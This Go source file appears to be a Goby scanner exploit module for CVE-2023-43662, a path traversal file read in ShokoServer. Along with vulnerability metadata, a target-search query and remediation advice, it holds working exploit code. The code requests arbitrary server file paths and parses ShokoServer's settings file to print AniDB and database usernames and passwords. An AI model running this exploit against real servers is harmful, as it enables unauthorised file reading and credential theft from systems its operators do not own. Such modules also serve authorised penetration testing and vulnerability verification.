package exploits

import (
	"encoding/json"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "ShokoServer /api/Image/withpath/ Path File Read Vulnerability (CVE-2023-43662)",
    "Description": "<p>ShokoServer is a server that makes managing your anime collection effortless, ensuring that your collection is organized, easy to access, and easy to navigate</p><p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Product": "ShokoServer",
    "Homepage": "https://shokoanime.com/",
    "DisclosureDate": "2023-09-28",
    "PostTime": "2023-10-10",
    "Author": "mayuze@baimaohui.net",
    "FofaQuery": "body=\"/webui/dist/main.\" || title=\"Shoko WEB UI\"",
    "GobyQuery": "body=\"/webui/dist/main.\" || title=\"Shoko WEB UI\"",
    "Level": "2",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>1. The official has fixed the vulnerability, please pay attention to the manufacturer's homepage update:<a href=\"http://www.example.com\">https://shokoanime.com/downloads/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "readConfig,filePath,showHosts",
            "show": ""
        },
        {
            "name": "filePath",
            "type": "input",
            "value": "",
            "show": "attackType=filePath"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2023-43662"
    ],
    "CNNVD": [
        "CNNVD-202309-2574"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.6",
    "Translation": {
        "CN": {
            "Name": "ShokoServer /api/Image/withpath/ 路径文件读取漏洞 （CVE-2023-43662）",
            "Product": "ShokoServer",
            "Description": "<p>ShokoServer是一个能使管理您的动漫收藏毫不费力，确保您的馆藏井井有条，易于访问， 并且易于导航的服务器<br></p><p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.example.com\" target=\"_blank\">https://shokoanime.com/downloads/</a><br></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "ShokoServer /api/Image/withpath/ Path File Read Vulnerability (CVE-2023-43662)",
            "Product": "ShokoServer",
            "Description": "<p>ShokoServer is a server that makes managing your anime collection effortless, ensuring that your collection is organized, easy to access, and easy to navigate<br></p><p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.<br></p>",
            "Recommendation": "<p>1. The official has fixed the vulnerability, please pay attention to the manufacturer's homepage update:<a href=\"http://www.example.com\" target=\"_blank\">https://shokoanime.com/downloads/</a><br></p><p>2. Set access policies and whitelist access through security devices such as firewalls.<br></p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10961"
}`
	sendPayload26265fgsdfg := func(hostInfo *httpclient.FixUrl, filePath string) (*httpclient.HttpResponse, error) {
		sendConfig := httpclient.NewGetRequestConfig("/api/Image/withpath/" + strings.Replace(url.PathEscape(filePath), " ", "%20", -1))
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, sendConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, singleScanConfig *scanconfig.SingleScanConfig) bool {
			resp, err := sendPayload26265fgsdfg(hostInfo, `C:\Windows\System32\drivers\etc\hosts`)
			if err != nil {
				return false
			}
			return strings.Contains(resp.Header.Get("Server"), "Kestrel") && resp.StatusCode == 200
		},
		func(expResult *jsonvul.ExploitResult, singleScanConfig *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(singleScanConfig.Params["attackType"])
			var filePath string
			if attackType == "filePath" {
				filePath = goutils.B2S(singleScanConfig.Params["filePath"])
			} else if attackType == "showHosts" {
				filePath = `C:\Windows\System32\drivers\etc\hosts`
			} else if attackType == "readConfig" {
				filePath = `C:\ProgramData\ShokoServer\settings-server.json`
			} else {
				expResult.Output = "不存在的利用方式"
				return expResult
			}
			if filePath == "" {
				expResult.Output = "文件路径不能为空"
				return expResult
			}
			resp, err := sendPayload26265fgsdfg(expResult.HostInfo, filePath)
			if err != nil {
				expResult.Output = "漏洞不存在"
				return expResult
			} else if !strings.Contains(resp.Header.Get("Server"), "Kestrel") || resp.RawBody == "" || resp.StatusCode != 200{
				expResult.Output = "漏洞不存在"
				return expResult
			}
			if attackType == "readConfig" {
				// 解析 JSON 数据到 map[string]interface{} 类型
				var data map[string]interface{}
				decoder := json.NewDecoder(strings.NewReader(resp.RawBody))
				if err := decoder.Decode(&data); err != nil {
					expResult.Output = "漏洞不存在"
					return expResult
				}

				// 使用接口方式获取 AniDb 的用户名和密码
				aniDbData, ok := data["AniDb"].(map[string]interface{})
				if !ok {
					expResult.Output = "漏洞不存在"
					return expResult
				}
				username, ok := aniDbData["Username"].(string)
				if !ok {
					expResult.Output = "漏洞不存在"
					return expResult
				}
				password, _ := aniDbData["Password"].(string)
				ServerAddress, _ := aniDbData["ServerAddress"].(string)
				ServerPort, _ := aniDbData["ServerPort"].(string)
				expResult.Output += fmt.Sprintf("AniData : \nServerAddress: https://%s:%s\nusername:%s\tpassword:%s\n\n", ServerAddress, ServerPort, username, password)

				// 使用接口方式获取 Database 的信息
				DatabaseData, ok := data["Database"].(map[string]interface{})
				if !ok {
					expResult.Output = "漏洞不存在"
					return expResult
				}
				Type, _ := DatabaseData["Type"].(string)
				if Type == "SQLite" {
					SqliteDatabaseFile, _ := DatabaseData["SQLite_DatabaseFile"].(string)
					MySqliteDirectory, _ := DatabaseData["MySqliteDirectory"].(string)
					if strings.Contains(SqliteDatabaseFile, MySqliteDirectory) {
						expResult.Output += "databaseData : sqlite://" + SqliteDatabaseFile
					} else {
						expResult.Output += "databaseData : sqlite://" + MySqliteDirectory + SqliteDatabaseFile
					}
				} else {
					username, _ = DatabaseData["Username"].(string)
					password, _ = DatabaseData["Password"].(string)
					Hostname, _ := DatabaseData["Hostname"].(string)
					Schema, _ := DatabaseData["Schema"].(string)
					expResult.Output = fmt.Sprintf("mysql://%s:%s@%s/%s", username, password, Hostname, Schema)
				}
				expResult.Success = true
				return expResult
			}
			expResult.Output = resp.RawBody
			expResult.Success = true
			return expResult
		},
	))
}
